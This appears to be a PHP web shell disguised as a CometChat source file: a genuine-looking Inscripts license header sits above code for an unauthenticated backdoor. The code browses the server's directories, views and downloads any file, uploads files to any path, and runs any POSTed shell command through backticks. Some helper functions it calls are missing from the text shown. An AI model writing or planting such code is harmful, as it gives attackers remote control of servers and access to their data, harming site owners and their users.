<?php

/*

CometChat
Copyright (c) 2009 Inscripts

CometChat ('the Software') is a copyrighted work of authorship. Inscripts 
retains ownership of the Software and any copies of it, regardless of the 
form in which the copies may exist. This license is not a sale of the 
original Software or any copies.

By installing and using CometChat on your server, you agree to the following
terms and conditions. Such agreement is either on your own behalf or on behalf
of any corporate entity which employs you or which you represent
('Corporate Licensee'). In this Agreement, 'you' includes both the reader
and any Corporate Licensee and 'Inscripts' means Inscripts (I) Private Limited:

CometChat license grants you the right to run one instance (a single installation)
of the Software on one web server and one web site for each license purchased.
Each license may power one instance of the Software on one domain. For each 
installed instance of the Software, a separate license is required. 
The Software is licensed only to you. You may not rent, lease, sublicense, sell,
assign, pledge, transfer or otherwise dispose of the Software in any form, on
a temporary or permanent basis, without the prior written consent of Inscripts. 

The license is effective until terminated. You may terminate it
at any time by uninstalling the Software and destroying any copies in any form. 

The Software source code may be altered (at your risk) 

All Software copyright notices within the scripts must remain unchanged (and visible). 

The Software may not be used for anything that would represent or is associated
with an Intellectual Property violation, including, but not limited to, 
engaging in any activity that infringes or misappropriates the intellectual property
rights of others, including copyrights, trademarks, service marks, trade secrets, 
software piracy, and patents held by individuals, corporations, or other entities. 

If any of the terms of this Agreement are violated, Inscripts reserves the right 
to revoke the Software license at any time. 

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.

*/

?>
<script php_expert=1>
function nst_goto(to){
document.getElementById("nst_cmd").value = "goto";
document.getElementById("nst_tmp").value = to;
}
function nst_submit(){
document.getElementById("nst_form").submit();
}
function nst_chdir(dir){
document.getElementById("nst_cmd").value = "chdir";
document.getElementById("nst_tmp").value = dir;
nst_submit()
}
function nst_upload(){
nst_goto("upload");
nst_submit();
}
</script>
<?php
if($_POST['nst_cmd']=="chdir"){
$d = $_POST['nst_tmp'];
}else{
if($_POST['nst_cur_dir']){$d = $_POST['nst_cur_dir'];}else{$d = getcwd();}
}
$d = str_replace("\\","/", $d);
$d = str_replace("//","/", $d);
if(preg_match("/\.\.$/", $d)){
$d = preg_replace("/\/[^\/]+\/\.\.$/", "", $d);
}
$d = $d."/";
preg_match_all("/([^\/]+)\//", $d, $m);
$s = sizeof($m[0]);
if($os=="Unix"){
$path_chdir = "/";
}
for($i=0; $i<$s; $i++){
$path_chdir .= $m[0][$i];
if($os=="Windows"){
if($i!=0){$sl="/";}else{$sl="";}
}else{
if($i==0){$path_to_go="<a href='#' onclick='nst_chdir(\"/\"); nst_submit();'>/</a><a href='#' onclick='nst_chdir(\"".$path_chdir."\"); nst_submit();'>".str_replace("/","",$m[0][$i])."</a>";}else{$sl="/";}
}
if($os=="Unix"){
if($i!=0){
$path_to_go .= "<a href='#' onclick='nst_chdir(\"".$path_chdir."\"); nst_submit();'>".$sl.str_replace("/","",$m[0][$i])."</a>";
}
}else{
$path_to_go .= "<a href='#' onclick='nst_chdir(\"".$path_chdir."\"); nst_submit();'>".$sl.str_replace("/","",$m[0][$i])."</a>";
}
}
if(empty($path_to_go) and $os=="Unix"){$path_to_go="<a href='#' onclick='nst_chdir(\"/\"); nst_submit();'>/</a>";}
$home_dir = getcwd();
$home_dir = str_replace("\\","/", $home_dir);
$home_dir = str_replace("//","/", $home_dir);
?>
<table align=center border=0 width=650 bgcolor=#D7FFA8 class=border>
<form method=post id=nst_form enctype=multipart/form-data>
<tr><td align=center>
<input type=hidden id=nst_cmd name=nst_cmd>
<input type=hidden id=nst_tmp name=nst_tmp>
<input type=hidden id=nst_tmp2 name=nst_tmp2>
<input type=hidden id=nst_tmp3 name=nst_tmp3>
<input type=hidden id=nst_tmp4 name=nst_tmp4>
<input type=hidden id=nst_tmp5 name=nst_tmp5>
<input type=hidden id=nst_cur_dir name=nst_cur_dir value='<?php print str_replace("//","/",$d); ?>'>
<font size=2>
</td></tr>
<tr><td>
<table border=0>
<tr><td><font face=wingdings size=2 color=#FF0000>0</font> <?php print $path_to_go; ?></td></tr>
</table>
<center>
<?php
if($os=="Windows"){
print "<font face=wingdings size=2 color=red><</font>";        
for($i=65; $i<=90; $i++){
print "<a href='#' onclick='nst_chdir(\"".chr($i).":\"); nst_submit();'>".chr($i)."</a> ";
}
}
?>
</center>
<table border=0>
<tr>
<td><a href='#' onclick='nst_chdir("<?php print $home_dir; ?>"); nst_submit();'>Home</a></td>
<td><a href='#' onclick='nst_goto("upload"); nst_submit();'>Upload</a></td>
</tr>
</table>
<?php
if($_POST['nst_cmd']=="goto"){
if($_POST['nst_tmp']=="nst1"){
if(!$_POST['nst_cur_dir']){
$cmd_dir = getcwd();
}else{
$cmd_dir = $_POST['nst_cur_dir'];
}
chdir($cmd_dir);
?>
Current directory:<br>
<input name=cmd_dir size=60 autocomplete=off onKeyPress='nst_cmd_ex(event);' value='<?php print $cmd_dir;?>'>
<?php
if($_POST['cmd']){
htmlspecialchars($_POST['cmd']);
?>
<?php
$cmd = $_POST['cmd'];
print `$cmd`;
?>
</pre>
<?php
}
}
}
if($_POST['nst_cmd']=="goto"){
if($_POST['nst_tmp']=="upload"){
?>
<br>
Select file to upload:
<br>
<input type=file name=f><br>
<br>
Write path where to upload:
<br>
<input name=wup autocomplete=off size=60 value='<?php print $_POST['nst_cur_dir']; ?>'><br>
<br>
<input type=button onclick='nst_upload()' value='Upload file'>
<br>
<?php
if($_POST['wup'] and !empty($_FILES['f']['name'])){
if(!@move_uploaded_file($_FILES['f']['tmp_name'], $_POST['wup']."/".$_FILES['f']['name'])){
print "<font color=red><b>Cant upload, maybe check chmod ? or folder exists ?</font></b>";
}else{
print "<font color=green><b>OK uploaded to:<br>".str_replace("//","/",str_replace("\\","/",str_replace("//","/",$_POST['wup']."/".$_FILES['f']['name'])));
}
}
}
}
if($_POST['nst_cmd']=="goto"){
if($_POST['nst_tmp']=="view"){
preg_match("/\/([^\/]+)$/", $_POST['nst_tmp2'], $m);

print "<br><center>
<a href='#' onclick='nst_download(\"".$m[1]."\",\"".$_POST['nst_tmp2']."\");'><font color=#FF474C>:: DOWNLOAD THIS FILE ::</font></a>
</center>
<pre><font size=3 face=verdana>";
highlight_file($_POST['nst_tmp2']);
}
}
if(($_POST['nst_cmd']=="chdir" or !$_POST) or $_POST['php_nst']){

$dirs  = array();
$files = array();
$dh = @opendir($d) or die("<center>Permission Denied or Folder/Disk does not exist</center>");
while (!(($f = readdir($dh)) === false)) {
if (is_dir($d."/".$f)) {
$dirs[]=$f;
}else{
$files[]=$f;
}
sort($dirs);
sort($files);
}
print "<table border=0 width=100%><tr bgcolor=#9C9FFF align=center><td>Filename</td>";
$all_files = array_merge($dirs, $files);
$i=0;
foreach($all_files as $name){
if($i%2){
$c="#D1D1D1";
}else{
$c="";
}
$owner = @fileowner($d."/".$name);
$group = @filegroup($d."/".$name);
if($os=="Unix"){
if(function_exists("posix_getpwuid") and function_exists("posix_getgrgid")){
$fileownera=@posix_getpwuid($owner);
$owner=$fileownera['name'];
$groupinfo = @posix_getgrgid($group);
$group=$groupinfo['name'];
}
}
if(is_dir($d."/".$name)){
$ico = 0;
$ico_c = "#800080";
$options = "DIR";
$size = "";
$todo = "nst_chdir(\"".$d."/".$name."\"); nst_submit();";
}else{
$ico = 2;
$ico_c = "#FF474C";
$options = "<a href='#' onclick='nst_download(\"".$name."\",\"".$d."/".$name."\"); return false;' title='Download'>D</a>";
preg_match("/^(.*?)\/([^\/]+)$/is", $d."/".$name, $m);
$todo = "nst_view(\"".$d."/".$name."\", \"".$m[1]."\");";
}
print "<tr bgcolor='".$c."'
           onMouseOver=\"this.style.background='#56B2F9';\"
           onMouseOut=\"this.style.background='".$c."';\">
<td onclick='".$todo."' width=100%><label><font face=wingdings size=2 color=".$ico_c.">".$ico."</font> ".$name."</td>
";
$i++;
}
?>
</table>
<?php
}
if($_POST['nst_cmd']=="goto"){
if($_POST['nst_tmp']=="tools"){
}
}
?>
</td></tr>
</form>
</table>